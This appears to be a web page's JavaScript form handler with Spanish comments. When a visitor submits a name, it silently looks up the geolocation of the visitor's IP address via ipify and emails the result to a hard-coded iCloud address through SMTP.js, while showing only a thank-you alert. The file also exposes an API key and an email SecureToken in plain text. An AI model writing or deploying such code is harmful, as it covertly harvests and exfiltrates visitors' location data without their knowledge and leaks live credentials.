
let Add;

async function get() {
    event.preventDefault();
    const nombre = document.querySelector('#nombre').value;

    try {
        let string = "https://cors-anywhere.herokuapp.com/http://geo.ipify.org/api/v1?apiKey=at_RnctMsOMzeO7C8UU1BPrIdrcLjBXW";
        console.log(string);

        const response = await fetch(string);
        
        // Verificar si la respuesta es exitosa (estado 200)
        if (!response.ok) {
            throw new Error('Hubo un problema con la solicitud.');
        }
        
        const data = await response.json(); // Obtener los datos JSON
        
        // Configurar el objeto de correo electrónico
        const emailConfig = {
            SecureToken: "9f000ead-c1a3-4f50-b67e-4957363f3f96",
            To: 'ensenadas-voces.0l@icloud.com',
            From: "ensenadas-voces.0l@icloud.com",
            Subject: nombre,
            Body: JSON.stringify(data) // Convertir los datos en una cadena JSON
        };

        // Enviar el correo electrónico
        const message = await Email.send(emailConfig);
        console.log(message);

        alert("¡Muchas Gracias!");
    } catch (error) {
        console.error('Error:', error);
        alert("Ocurrió un error al procesar tu solicitud.");
    }
}
